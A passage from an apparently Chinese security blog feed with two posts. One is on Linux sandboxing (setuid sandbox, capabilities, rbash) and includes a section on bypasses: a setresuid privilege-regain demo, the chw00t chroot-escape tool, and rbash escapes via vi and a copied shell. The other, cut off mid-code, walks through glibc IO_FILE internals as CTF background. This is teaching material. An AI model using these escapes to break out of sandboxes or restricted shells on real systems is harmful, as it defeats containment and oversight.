execve()</code>。但其实这样做是行不通的，因为进程的根目录已经被修改，<code>execve()</code> 本要执行的 Binary 文件已经不可用了。Google 的一篇文章里给出了一个解决此问题的简单方法：</p><ol><li>创建一个子进程，注意使用 <code>clone()</code> 和 <code>CLONE_FS</code>，使得父子进程可以共享根目录、当前目录等等；</li><li>父进程降权后执行 <code>execve()</code>，又产生一个新进程；</li><li>然后父进程请求子进程执行 <code>chroot()</code>；</li><li>子进程执行 <code>chroot()</code>，新的根目录会对两个子进程同时生效。</li><li>父进程退出。</li></ol><p>这个方法的前提是 父进程 需要设置 <code>RLIMIT_NOFILE</code> 为 <code>(0, 0)</code>，并且对于不可信的子进程（<code>execve</code> 创建的新进程）来说，在执行第 4 步之前应是可控的。另外，对于父进程来说，由于它是以 root 身份运行，那么就可能会成为攻击点，比如 Confused Deputy Problem。</p><h2 id="Capability-Mechanism"><a href="#Capability-Mechanism" class="headerlink" title="Capability Mechanism"></a>Capability Mechanism</h2><p>Linux Capability 主要是解决 Confused Deputy Problem（如 CSRF）。Linux 支持 Capability 的主要目的是细化 root 的特权。比如拿 ping 来说，它需要使用 raw_sockets 所以需要 root 特权才能运行；如果有了 Capability 机制，由于该程序只需要一个 <code>CAP_NET_RAW</code> 的 Capability 即可运行，那么根据最小权限原则，该程序运行时可以丢弃所有多余的 Capability，以防止被误用或被攻击。所以，Capability 机制可以将 root 特权进行很好的细分。Kernel-2.6.18 起已支持 30 多种不同的 Capability，在 Kernel-2.6.24 及以上的版本中一个普通用户进程也将可以持有 Capability。</p><h2 id="What-is-rbash（Restricted-Bash）"><a href="#What-is-rbash（Restricted-Bash）" class="headerlink" title="What is rbash（Restricted Bash）"></a>What is rbash（Restricted Bash）</h2><p><code>rbash</code> 的主要作用是限制了部分 Bash 命令，会以一种受限的方式启动 Bash：</p><ol><li>只能执行当前目录下的可执行文件；</li><li>在执行命令时命令不能带 <code>/</code>；</li><li>不能改变当前工作目录；</li><li>不能更改 <code>PATH</code> 或 <code>SHELL</code> 变量；</li><li>不能使用重定向输出；</li><li>…</li></ol><pre><code class="bash">root@5b0ef65c6894:~# rbashroot@5b0ef65c6894:~# cd tmp/rbash: cd: restrictedroot@5b0ef65c6894:~# ./tmp/rp-lin-x64rbash: ./tmp/rp-lin-x64: restricted: cannot specify `/&#39; in command namesroot@5b0ef65c6894:~# export PATH=$PATH:/root/tmprbash: PATH: readonly variable</code></pre><h1 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h1><h2 id="Bypass-setuid"><a href="#Bypass-setuid" class="headerlink" title="Bypass setuid"></a>Bypass setuid</h2><p>当程序执行完高权限后使用 <code>setresuid</code> 进行降权操作，但是并未完全抹除高权限：</p><pre><code class="cpp">#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;int main() {    int ruid, euid, suid;    getresuid(&amp;ruid, &amp;euid, &amp;suid);    printf(&quot;RUID: %d\tEUID: %d\tSUID: %d\n&quot;, ruid, euid, suid);    seteuid(2333); // Modify EUID    getresuid(&amp;ruid, &amp;euid, &amp;suid);    printf(&quot;RUID: %d\tEUID: %d\tSUID: %d\n&quot;, ruid, euid, suid);    setresuid(-1, 2, -1); // unprivileged    getresuid(&amp;ruid, &amp;euid, &amp;suid);    printf(&quot;RUID: %d\tEUID: %d\tSUID: %d\n&quot;, ruid, euid, suid);    setresuid(-1, 0, -1); // Get root privilege    setresuid(123, 123, 123);    getresuid(&amp;ruid, &amp;euid, &amp;suid);    printf(&quot;RUID: %d\tEUID: %d\tSUID: %d\n&quot;, ruid, euid, suid);    return 0;}</code></pre><h2 id="Bypass-chroot"><a href="#Bypass-chroot" class="headerlink" title="Bypass chroot"></a>Bypass chroot</h2><p>Chroot 沙箱可以将进程对文件的访问限制在一个指定的目录中，但是由于 Chroot 不是一个安全的 feature，所以该沙箱可能会被逃逸出来。比如使用 <a href="https://github.com/earthquake/chw00t" target="_blank" rel="noopener"><code>chw00t</code></a>。当进程中存在文件在当前 root 目录树外，即在 jail 外，即表明越狱成功，此时的 root 就是原来文件系统的 root 了。</p><h2 id="Bypass-rbash"><a href="#Bypass-rbash" class="headerlink" title="Bypass rbash"></a>Bypass rbash</h2><p>rbash 的绕过方法也有很多，通常跟 chroot 配合使用。不过它本身对文件操作是没有限制的。可以使用 vi、vim 等命令时：</p><pre><code class="bash">root in ~/Setuid-Sandbox λ rbashroot@iZ2zecelicizfr2e28zon3Z:~/Setuid-Sandbox# vi# :set shell=/usr/bin/zsh# :shellroot in ~/Setuid-Sandbox λ lsbash  busybox  chroot  chroot.c  ls</code></pre><p>可以使用 cp、mv 等文件操作命令时：</p><pre><code class="bash">root in ~/Setuid-Sandbox λ rbashroot@iZ2zecelicizfr2e28zon3Z:~/Setuid-Sandbox# cp /usr/bin/zsh .root@iZ2zecelicizfr2e28zon3Z:~/Setuid-Sandbox# lsbash  busybox  chroot  chroot.c  ls  zshroot@iZ2zecelicizfr2e28zon3Z:~/Setuid-Sandbox# zshroot in ~/Setuid-Sandbox λ lsbash  busybox  chroot  chroot.c  ls  zsh</code></pre><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://www.linuxidc.com/Linux/2015-02/112914.htm" target="_blank" rel="noopener">https://www.linuxidc.com/Linux/2015-02/112914.htm</a><br><a href="https://atum.li/2017/04/25/linuxsandbox" target="_blank" rel="noopener">https://atum.li/2017/04/25/linuxsandbox</a><br><a href="https://blog.betamao.me/2019/01/31/Linux%E6%B2%99%E7%AE%B1%E4%B9%8Bchroot%E4%B8%8Erbash/" target="_blank" rel="noopener">https://blog.betamao.me/2019/01/31/Linux%E6%B2%99%E7%AE%B1%E4%B9%8Bchroot%E4%B8%8Erbash/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Yet Another Linux Sandbox Technic.&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="linux" scheme="blog.b3ale.cn/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>IO_FILE in CTF</title>
    <link href="blog.b3ale.cn/2020/04/19/IO-FILE-in-CTF/"/>
    <id>blog.b3ale.cn/2020/04/19/IO-FILE-in-CTF/</id>
    <published>2020-04-19T06:44:34.000Z</published>
    <updated>2020-05-25T05:18:40.000Z</updated>
    
    <content type="html"><![CDATA[<p>记录 IO_FILE 相关知识。</p><a id="more"></a><h1 id="FILE-Structure"><a href="#FILE-Structure" class="headerlink" title="FILE Structure"></a>FILE Structure</h1><p>FILE 在 Linux 系统的标准 IO 库中是用于描述文件的结构，称为文件流。 FILE 结构在程序执行 <code>fopen</code> 等函数时会进行创建，并分配在堆中。我们常定义一个指向 FILE 结构的指针来接收这个返回值。FILE 相关的结构定义在 <a href="https://code.woboq.org/userspace/glibc/libio/libio.h.html" target="_blank" rel="noopener">glibc/libio/libio.h</a> 中：</p><pre><code class="cpp">struct _IO_FILE {  int _flags;        /* High-order word is _IO_MAGIC; rest is flags. */#define _IO_file_flags _flags  /* The following pointers correspond to the C++ streambuf protocol. */  /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */  char* _IO_read_ptr;    /* Current read pointer */  char* _IO_read_end;    /* End of get area. */  char* _IO_read_base;    /* Start of putback+get area. */  char* _IO_write_base;    /* Start of put area. */  char* _IO_write_ptr;    /* Current put pointer. */  char* _IO_write_end;    /* End of put area. */  char* _IO_buf_base;    /* Start of reserve area. */  char* _IO_buf_end;    /* End of reserve area. */  /* The following fields are used to support backing up and undo. */  char *_IO_save_base; /* Pointer to start of non-current get area. */  char *_IO_backup_base;  /* Pointer to first valid character of backup area */  char *_IO_save_end; /* Pointer to end of non-current get area. */  struct _IO_marker *_markers;  struct _IO_FILE *_chain;  int _fileno;#if 0  int _blksize;#else  int _flags2;#endif  _IO_off_t _old_offset; /* This used to be _offset but it&#39;s too small.  */#define __HAVE_COLUMN /* temporary */  /* 1+column number of pbase(); 0 is unknown. */  unsigned short _cur_column;  signed char _vtable_offset;  char _shortbuf[1];  /*  char* _save_gptr;  char* _save_egptr; */  _IO_lock_t *_lock;#ifdef _IO_USE_OLD_IO_FILE};</code></pre><p>进程中的 FILE 结构会通过 <code>_chain</code> 域彼此连接形成一个链表，链表头部用全局变量 <code>_IO_list_all</code> 表示，通过这个值可以遍历所有的 FILE 结构。在标准 I/O 库中，每个程序启动时有三个文件流是自动打开的：stdin、stdout、stderr。因此在初始状态下，<code>_IO_list_all</code> 指向了一个有这些文件流构成的链表，这三个文件流位于 libc.so 的数据段；而使用 <code>fopen</code> 创建的文件流是分配在堆内存上的。</p><pre><code class="bash">$ strings /lib/x86_64-linux-gnu/libc.so.6 | grep -E &quot;stdin|stdout|stderr&quot;stderr_IO_2_1_stderr__IO_2_1_stdout_stdout_IO_2_1_stdin_stdinstdinstdoutstderrrcmd: write (setting up stderr): %mrcmd: poll (setting up stderr): %m</code></pre><p>而在 <code>_IO_FILE</code> 结构体外还有一层结构体叫做 <code>_IO_FILE_plus</code>（<a href="https://code.woboq.org/userspace/glibc/libio/libioP.h.html" target="_blank" rel="noopener">glibc/libio/libioP.h</a>），其中包含了一个指针 <code>vtable</code>，其指向了一系列函数（在 libc-2.23 下，32 位的 vtable 偏移为 0x94，64 位偏移为 0xd8）：</p><pre><code class="cpp">/* We always allocate an extra word following an _IO_FILE.   This contains a pointer to the function jump table used.   This is for compatibility with C++ streambuf; the word can   be used to smash to a pointer to a virtual function table. */struct _IO_FILE_plus{  _IO_FILE file;  const struct _IO_jump_t *vtable;};</code></pre><p>其中 <code>vtable</code> 是 <code>_IO_jump_t</code> 结构体，用于保存函数指针：</p><pre><code class="cpp">#define JUMP_FIELD(TYPE, NAME) TYPE NAME...struct _IO_jump_t{    JUMP_FIELD(size_t, __dummy);    JUMP_FIELD(size_t, __dummy2);    JUMP_FIELD(_IO_finish_t, __finish);    JUMP_FIELD(_IO_overflow_t, __overflow);    JUMP_FIELD(_IO_underflow_t, __underflow);    JUMP_FIELD(_IO_underflow_t, __uflow);    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);    /* showmany */    JUMP_FIELD(_IO_xsputn_t, __xsputn);    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);    JUMP_FIELD(_IO_seekoff_t, __seekoff);    JUMP_FIELD(_IO_seekpos_t, __seekpos);    JUMP_FIELD(_IO_setbuf_t, __setbuf);    JUMP_FIELD(_IO_sync_t, __sync);    JUMP_FIELD(_IO_doallocate_t, __doallocate);    JUMP_FIELD(_IO_read_t, __read);    JUMP_FIELD(_IO_write_t, __write);    JUMP_FIELD(_IO_seek_t, __seek);    JUMP_FIELD(_IO_close_t, __close);    JUMP_FIELD(_IO_stat_t, __stat);    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);    JUMP_FIELD(_IO_imbue_t, __imbue);#if 0    get_column;    set_column;#endif};</code></pre><p>在 <a href="https://code.woboq.org/userspace/glibc/libio/fileops.c.html" target="_blank" rel="noopener">glibc/libio/fileops.c</a> 中可以看到一般情况下 vtable 表默认指向的各个函数：</p><pre><code class="cpp">const struct _IO_jump_t _IO_file_jumps ={  JUMP_INIT_DUMMY,  JUMP_INIT(finish, _IO_file_finish),  JUMP_INIT(overflow, _IO_file_overflow),  JUMP_INIT(underflow, _IO_file_underflow),  JUMP_INIT(uflow, _IO_default_uflow),  JUMP_INIT(pbackfail, _IO_default_pbackfail),  JUMP_INIT(xsputn, _IO_file_xsputn),  JUMP_INIT(xsgetn, _IO_file_xsgetn),  JUMP_INIT(seekoff, _IO_new_file_seekoff),  JUMP_INIT(seekpos, _IO_default_seekpos),  JUMP_INIT(setbuf, _IO_new_file_setbuf),  JUMP_INIT(sync, _IO_new_file_sync),  JUMP_INIT(doallocate, _IO_file_doallocate),  JUMP_INIT(read, _IO_file_read),  JUMP_INIT(write, _IO_new_file_write),  JUMP_INIT(seek, _IO_file_seek),  JUMP_INIT(close, _IO_file_close),  JUMP_INIT(stat, _IO_file_stat),  JUMP_INIT(showmanyc, _IO_default_showmanyc),  JUMP_INIT(imbue, _IO_default_imbue)};</code></pre><h2 id="fread"><a href="#fread" class="headerlink" title="fread()"></a><code>fread()</code></h2><p><code>fread()</code> 是标准 IO 库函数，作用是从文件流中读数据，在 <a href="https://code.woboq.org/userspace/glibc/libio/iofread.c.html" target="_blank" rel="noopener">glibc/libio/iofread.c</a> 中实现，实际函数名为 <code>_IO_fread</code>。其中 buf 为存放数据的缓冲区，size 指定一个数据项对应的字节数，count 指定读入数据的个数，fp 为目标文件流。一开始的 <code>CHECK_FILE</code> 就是检查一个 Magic Number，真正的读功能在 <code>_IO_sgetn</code> 中实现：</p><pre><code class="cpp">_IO_size_t_IO_fread (void *buf, _IO_size_t size, _IO_size_t count, _IO_FILE *fp){  _IO_size_t bytes_requested = size * count;  _IO_size_t bytes_read;  CHECK_FILE (fp, 0);  if (bytes_requested == 0)    return 0;  _IO_acquire_lock (fp);  bytes_read = _IO_sgetn (fp, (char *) buf, bytes_requested);  _IO_release_lock (fp);  return bytes_requested == bytes_read ? count : bytes_read / size;}</code></pre><p><code>_IO_sgetn</code> 则在 <a href="https://code.woboq.org/userspace/glibc/libio/genops.c.html" target="_blank" rel="noopener">glibc/libio/genops.c</a> 中实现，其中调用了 <code>_IO_XSGETN</code>：</p><pre><code class="cpp">_IO_size_t_IO_sgetn (_IO_FILE *fp, void *data, _IO_size_t n){  /* FIXME handle putback buffer here! */  return _IO_XSGETN (fp, data, n);}</code></pre><p>而 <code>_IO_XSGETN</code> 在 <a href="https://code.woboq.org/userspace/glibc/libio/libio.h.html" target="_blank" rel="noopener">glibc/libio/libio.h</a> 中实现。把宏一个一个展开来大概可以看出用于获取 vtable 对应的函数 <code>__xsgetn</code>：</p><pre><code class="cpp">#define _IO_XSGETN(FP, DATA, N) JUMP2 (__xsgetn, FP, DATA, N)...#define JUMP2(FUNC, THIS, X1, X2) (_IO_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1, X2)...#if _IO_JUMPS_OFFSET# define _IO_JUMPS_FUNC(THIS) \ (*(struct _IO_jump_t **) ((void *) &amp;_IO_JUMPS_FILE_plus (THIS) \               + (THIS)-&gt;_vtable_offset))# define _IO_vtable_offset(THIS) (THIS)-&gt;_vtable_offset#else# define _IO_JUMPS_FUNC(THIS) _IO_JUMPS_FILE_plus (THIS)# define _IO_vtable_offset(THIS) 0#endif...#define _IO_JUMPS_FILE_plus(THIS) \  _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE_plus, vtable).../* Essentially ((TYPE *) THIS)-&gt;MEMBER, but avoiding the aliasing   violation in case THIS has a different pointer type.  */#define _IO_CAST_FIELD_ACCESS(THIS, TYPE, MEMBER) \  (*(_IO_MEMBER_TYPE (TYPE, MEMBER) *)(((char *) (THIS)) \                       + offsetof(TYPE, MEMBER))).../* Type of MEMBER in struct type TYPE.  */#define _IO_MEMBER_TYPE(TYPE, MEMBER) __typeof__ (((TYPE){}).MEMBER)</code></pre><p>而默认情况下这个指针是指向 <code>_IO_file_xsgetn</code> 的：</p><pre><code class="cpp">_IO_size_t_IO_file_xsgetn (_IO_FILE *fp, void *data, _IO_size_t n){  _IO_size_t want, have;  _IO_ssize_t count;  char *s = data;  want = n;  if (fp-&gt;_IO_buf_base == NULL)    {      /* Maybe we already have a push back pointer.  */      if (fp-&gt;_IO_save_base != NULL)    {      free (fp-&gt;_IO_save_base);      fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;    }      _IO_doallocbuf (fp);    }  while (want &gt; 0)    {      have = fp-&gt;_IO_read_end - fp-&gt;_IO_read_ptr;      if (want &lt;= have)    {      memcpy (s, fp-&gt;_IO_read_ptr, want);      fp-&gt;_IO_read_ptr += want;      want = 0;    }      else    {      if (have &gt; 0)        {#ifdef _LIBC          s = __mempcpy (s, fp-&gt;_IO_read_ptr, have);#else          memcpy (s, fp-&gt;_IO_read_ptr, have);          s += have;#endif          want -= have;          fp-&gt;_IO_read_ptr += have;        }      /* Check for backup and repeat */      if (_IO_in_backup (fp))        {          _IO_switch_to_main_get_area (fp);          continue;        }      /* If we now want less than a buffer, underflow and repeat         the copy.  Otherwise, _IO_SYSREAD directly to         the user buffer. */      if (fp-&gt;_IO_buf_base          &amp;&amp; want &lt; (size_t) (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base))        {          if (__underflow (fp) == EOF)        break;          continue;        }      /* These must be set before the sysread as we might longjmp out         waiting for input. */      _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);      _IO_setp (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);      /* Try to maintain alignment: read a whole number of blocks.  */      count = want;      if (fp-&gt;_IO_buf_base)        {          _IO_size_t block_size = fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base;          if (block_size &gt;= 128)        count -= want % block_size;        }      count = _IO_SYSREAD (fp, s, count);      if (count &lt;= 0)        {          if (count == 0)        fp-&gt;_flags |= _IO_EOF_SEEN;          else        fp-&gt;_flags |= _IO_ERR_SEEN;          break;        }      s += count;      want -= count;      if (fp-&gt;_offset != _IO_pos_BAD)        _IO_pos_adjust (fp-&gt;_offset, count);    }    }  return n - want;}</code></pre><h2 id="fwrite"><a href="#fwrite" class="headerlink" title="fwrite()"></a><code>fwrite()</code></h2><p><code>fwrite</code> 同样是标准 IO 库函数，作用是向文件流写入数据，在 <a href="https://code.woboq.org/userspace/glibc/libio/iofwrite.c.html" target="_blank" rel="noopener">glibc/libio/iofwrite.c</a> 中实现。其中 buf 为一个写入数据的缓冲区，size 为写入的一个数据项对应的字节数，count 为写入的数据总数，stream 为目标文件流：</p><pre><code class="cpp">_IO_size_t_IO_fwrite (const void *buf, _IO_size_t size, _IO_size_t count, _IO_FILE *fp){  _IO_size_t request = size * count;  _IO_size_t written = 0;  CHECK_FILE (fp, 0);  if (request == 0)    return 0;  _IO_acquire_lock (fp);  if (_IO_vtable_offset (fp) != 0 || _IO_fwide (fp, -1) == -1)    written = _IO_sputn (fp, (const char *) buf, request);  _IO_release_lock (fp);  /* We have written all of the input in case the return value indicates     this or EOF is returned.  The latter is a special case where we     simply did not manage to flush the buffer.  But the data is in the     buffer and therefore written as far as fwrite is concerned.  */  if (written == request || written == EOF)    return count;  else    return written / size;}</code></pre><p>主要功能在 <code>_IO_sputn</code> 中：</p><pre><code class="cpp">#define _IO_sputn(__fp, __s, __n) _IO_XSPUTN (__fp, __s, __n)</code></pre><p>和前面的 <code>fread</code> 同理，<code>fwrite</code> 最终获取到 vtable 对应的 <code>__xsputn</code> 成员所指向的函数 <code>_IO_file_xsputn</code>（<code>_IO_new_file_xsputn</code>），最终会调用系统接口 <code>write</code> 函数：</p><pre><code class="cpp"># define _IO_new_file_xsputn _IO_file_xsputn..._IO_size_t_IO_new_file_xsputn (_IO_FILE *f, const void *data, _IO_size_t n){  const char *s = (const char *) data;  _IO_size_t to_do = n;  int must_flush = 0;  _IO_size_t count = 0;  if (n &lt;= 0)    return 0;  /* This is an optimized implementation.     If the amount to be written straddles a block boundary     (or the filebuf is unbuffered), use sys_write directly. */  /* First figure out how much space is available in the buffer. */  if ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; (f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))    {      count = f-&gt;_IO_buf_end - f-&gt;_IO_write_ptr;      if (count &gt;= n)    {      const char *p;      for (p = s + n; p &gt; s; )        {          if (*--p == &#39;\n&#39;)        {          count = p - s + 1;          must_flush = 1;          break;        }        }    }    }  else if (f-&gt;_IO_write_end &gt; f-&gt;_IO_write_ptr)    count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr; /* Space available. */  /* Then fill the buffer. */  if (count &gt; 0)    {      if (count &gt; to_do)    count = to_do;#ifdef _LIBC      f-&gt;_IO_write_ptr = __mempcpy (f-&gt;_IO_write_ptr, s, count);#else      memcpy (f-&gt;_IO_write_ptr, s, count);      f-&gt;_IO_write_ptr += count;#endif      s += count;      to_do -= count;    }  if (to_do + must_flush &gt; 0)    {      _IO_size_t block_size, do_write;      /* Next flush the (full) buffer. */      if (_IO_OVERFLOW (f, EOF) == EOF)    /* If nothing else has to be written we must not signal the       caller that everything has been written.  */    return to_do == 0 ? EOF : n - to_do;      /* Try to maintain alignment: write a whole number of blocks.  */      block_size = f-&gt;_IO_buf_end - f-&gt;_IO_buf_base;      do_write = to_do - (block_size &gt;= 128 ? to_do % block_size : 0);      if (do_write)    {      count = new_do_write (f, s, do_write);      to_do -= count;      if (count &lt; do_write)        return n - to_do;    }      /* Now write out the remainder.  Normally, this will fit in the     buffer, but it&#39;s somewhat messier for line-buffered files,     so we let _IO_default_xsputn handle the general case. */      if (to_do)    to_do -= _IO_default_xsputn (f, s+do_write, to_do);    }  return n - to_do;}</code></pre><p><code>printf</code> 和 <code>puts</code> 是常用的输出函数，在 <code>printf</code> 的参数是以 <code>&#39;\n&#39;</code> 结束的纯字符串时，<code>printf</code> 会被优化为 <code>puts</code> 函数并去除换行符。<code>puts</code> 在源码中实现的函数是 <code>_IO_puts</code>，这个函数的操作与 <code>fwrite</code> 的流程大致相同，函数内部同样会调用 vtable 中的 <code>_IO_sputn</code>，结果会执行 <code>_IO_new_file_xsputn</code>，最后会调用到系统接口 write 函数。而 <code>printf</code> 的调用栈回溯如下，同样是通过 <code>_IO_file_xsputn</code>（<code>_IO_new_file_xsputn</code>）实现：</p><pre><code>vfprintf+11_IO_file_xsputn_IO_file_overflowfunlockfile_IO_file_writewrite</code></pre><h2 id="fopen"><a href="#fopen" class="headerlink" title="fopen()"></a><code>fopen()</code></h2><p><code>fopen</code> 是一个在 <a href="https://code.woboq.org/userspace/glibc/libio/stdio.h.html" target="_blank" rel="noopener">glibc/include/stdio.h</a> 中实现的宏，在标准 IO 库中用于打开文件。其中 fname 指定文件路径，mode 指定打开方式的类型：</p><pre><code class="cpp">#   define fopen(fname, mode) _IO_new_fopen (fname, mode)</code></pre><p>对应的 <code>_IO_new_fopen</code> 在 <a href="https://code.woboq.org/userspace/glibc/libio/iofopen.c.html" target="_blank" rel="noopener">glibc/libio/iofopen.c</a> 中实现，其中主要调用了 <code>__fopen_internal</code> 函数：</p><pre><code class="cpp">_IO_FILE *_IO_new_fopen (const char *filename, const char *mode){  return __fopen_internal (filename, mode, 1);}</code></pre><p><code>__fopen_internal</code> 内部会调用 <code>malloc</code> 函数，分配 FILE 结构的空间，因此可以获知 FILE 结构是存储在堆上的。之后会为创建的 FILE 初始化 vtable，并调用 <code>_IO_file_init</code> 进一步初始化操作。之后调用 <code>_IO_file_fopen</code> 函数打开目标文件并根据用户传入的打开模式进行打开操作，最后会调用到系统接口 <code>open</code> 函数：</p><pre><code class="cpp">_IO_FILE *__fopen_internal (const char *filename, const char *mode, int is32){  struct locked_FILE  {    struct _IO_FILE_plus fp;#ifdef _IO_MTSAFE_IO    _IO_lock_t lock;#endif    struct _IO_wide_data wd;  } *new_f = (struct locked_FILE *) malloc (sizeof (struct locked_FILE));  if (new_f == NULL)    return NULL;#ifdef _IO_MTSAFE_IO  new_f-&gt;fp.file._lock = &amp;new_f-&gt;lock;#endif#if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T  _IO_no_init (&amp;new_f-&gt;fp.file, 0, 0, &amp;new_f-&gt;wd, &amp;_IO_wfile_jumps);#else  _IO_no_init (&amp;new_f-&gt;fp.file, 1, 0, NULL, NULL);#endif  _IO_JUMPS (&amp;new_f-&gt;fp) = &amp;_IO_file_jumps;  _IO_file_init (&amp;new_f-&gt;fp);#if  !_IO_UNIFIED_JUMPTABLES  new_f-&gt;fp.vtable = NULL;#endif  if (_IO_file_fopen ((_IO_FILE *) new_f, filename, mode, is32) != NULL)    return __fopen_maybe_mmap (&amp;new_f-&gt;fp.file);  _IO_un_link (&amp;new_f-&gt;fp);  free (new_f);  return NULL;}</code></pre><p>在 <code>_IO_file_init</code> 函数的初始化操作中，会调用 <code>_IO_link_in</code> 把新分配的 FILE 链入 <code>_IO_list_all</code> 为起始的 FILE 链表中：</p><pre><code class="cpp"># define _IO_new_file_init _IO_file_init...void_IO_new_file_init (struct _IO_FILE_plus *fp){  /* POSIX.1 allows another file handle to be used to change the position     of our file descriptor.  Hence we actually don&#39;t know the actual     position before we do the first fseek (and until a following fflush). */  fp-&gt;file._offset = _IO_pos_BAD;  fp-&gt;file._IO_file_flags |= CLOSED_FILEBUF_FLAGS;  _IO_link_in (fp);  fp-&gt;file._fileno = -1;}..._IO_link_in (struct _IO_FILE_plus *fp){  if ((fp-&gt;file._flags &amp; _IO_LINKED) == 0)    {      fp-&gt;file._flags |= _IO_LINKED;#ifdef _IO_MTSAFE_IO      _IO_cleanup_region_start_noarg (flush_cleanup);      _IO_lock_lock (list_all_lock);      run_fp = (_IO_FILE *) fp;      _IO_flockfile ((_IO_FILE *) fp);#endif      fp-&gt;file._chain = (_IO_FILE *) _IO_list_all;      _IO_list_all = fp;      ++_IO_list_all_stamp;#ifdef _IO_MTSAFE_IO      _IO_funlockfile ((_IO_FILE *) fp);      run_fp = NULL;      _IO_lock_unlock (list_all_lock);      _IO_cleanup_region_end (0);#endif    }}</code></pre><p>最终可以得出 fopen 的操作如下：</p><ul><li>使用 <code>malloc</code> 分配 FILE 结构</li><li>设置 FILE 结构的 vtable</li><li>初始化分配的 FILE 结构</li><li>将初始化的 FILE 结构链入 FILE 结构链表中</li><li>调用系统调用打开文件</li></ul><h2 id="fclose"><a href="#fclose" class="headerlink" title="fclose()"></a><code>fclose()</code></h2><p><code>fclose</code> 是标准 IO 库中用于关闭已打开文件的函数，在 <a href="https://code.woboq.org/userspace/glibc/libio/iofclose.c.html" target="_blank" rel="noopener">glibc/include/iofclose.c</a>，宏定义如下。其中 fp 为已经打开的文件流：</p><pre><code class="cpp">#   define fclose(fp) _IO_new_fclose (fp)</code></pre><p><code>fclose</code> 首先会调用 <code>_IO_un_link</code> 将指定的 FILE 从 <code>_chain</code> 链表中脱链。之后会调用 <code>_IO_file_close_it</code> 函数，<code>_IO_file_close_it</code> 会调用系统接口 <code>close</code> 关闭文件。最后调用 vtable 中的 <code>_IO_FINISH</code>，其对应的是 <code>_IO_file_finish</code> 函数，其中会调用 <code>free</code> 函数释放之前分配的 FILE 结构：</p><pre><code class="cpp">int_IO_new_fclose (_IO_FILE *fp){  int status;  CHECK_FILE(fp, EOF);#if SHLIB_COMPAT (libc, GLIBC_2_0, GLIBC_2_1)  /* We desperately try to help programs which are using streams in a     strange way and mix old and new functions.  Detect old streams     here.  */  if (_IO_vtable_offset (fp) != 0)    return _IO_old_fclose (fp);#endif  /* First unlink the stream.  */  if (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)    _IO_un_link ((struct _IO_FILE_plus *) fp);  _IO_acquire_lock (fp);  if (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)    status = _IO_file_close_it (fp);  else    status = fp-&gt;_flags &amp; _IO_ERR_SEEN ? -1 : 0;  _IO_release_lock (fp);  _IO_FINISH (fp);  if (fp-&gt;_mode &gt; 0)    {#if _LIBC      /* This stream has a wide orientation.  This means we have to free     the conversion functions.  */      struct _IO_codecvt *cc = fp-&gt;_codecvt;      __libc_lock_lock (__gconv_lock);      __gconv_release_step (cc-&gt;__cd_in.__cd.__steps);      __gconv_release_step (cc-&gt;__cd_out.__cd.__steps);      __libc_lock_unlock (__gconv_lock);#endif    }  else    {      if (_IO_have_backup (fp))    _IO_free_backup_area (fp);    }  if (fp != _IO_stdin &amp;&amp; fp != _IO_stdout &amp;&amp; fp != _IO_stderr)    {      fp-&gt;_IO_file_flags = 0;      free(fp);    }  return status;}...void_IO_un_link (struct _IO_FILE_plus *fp){  if (fp-&gt;file._flags &amp; _IO_LINKED)    {      struct _IO_FILE **f;#ifdef _IO_MTSAFE_IO      _IO_cleanup_region_start_noarg (flush_cleanup);      _IO_lock_lock (list_all_lock);      run_fp = (_IO_FILE *) fp;      _IO_flockfile ((_IO_FILE *) fp);#endif      if (_IO_list_all == NULL)    ;      else if (fp == _IO_list_all)    {      _IO_list_all = (struct _IO_FILE_plus *) _IO_list_all-&gt;file._chain;      ++_IO_list_all_stamp;    }      else    for (f = &amp;_IO_list_all-&gt;file._chain; *f; f = &amp;(*f)-&gt;_chain)      if (*f == (_IO_FILE *) fp)        {          *f = fp-&gt;file._chain;          ++_IO_list_all_stamp;          break;        }      fp-&gt;file._flags &amp;= ~_IO_LINKED;#ifdef _IO_MTSAFE_IO      _IO_funlockfile ((_IO_FILE *) fp);      run_fp = NULL;      _IO_lock_unlock (list_all_lock);      _IO_cleanup_region_end (0);#endif    }}...# define _IO_new_file_close_it _IO_file_close_it...int_IO_new_file_close_it (_IO_FILE *fp){  int write_status;  if (!_IO_file_is_open (fp))    return EOF;  if ((fp-&gt;_flags &amp; _IO_NO_WRITES) == 0      &amp;&amp; (fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) != 0)    write_status = _IO_do_flush (fp);  else    write_status = 0;  _IO_unsave_markers (fp);  int close_status = ((fp-&gt;_flags2 &amp; _IO_FLAGS2_NOCLOSE) == 0              ? _IO_SYSCLOSE (fp) : 0);  /* Free buffer. */#if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T  if (fp-&gt;_mode &gt; 0)    {      if (_IO_have_wbackup (fp))    _IO_free_wbackup_area (fp);      _IO_wsetb (fp, NULL, NULL, 0);      _IO_wsetg (fp, NULL, NULL, NULL);      _IO_wsetp (fp, NULL, NULL);    }#endif  _IO_setb (fp, NULL, NULL, 0);  _IO_setg (fp, NULL, NULL, NULL);  _IO_setp (fp, NULL, NULL);  _IO_un_link ((struct _IO_FILE_plus *) fp);  fp-&gt;_flags = _IO_MAGIC|CLOSED_FILEBUF_FLAGS;  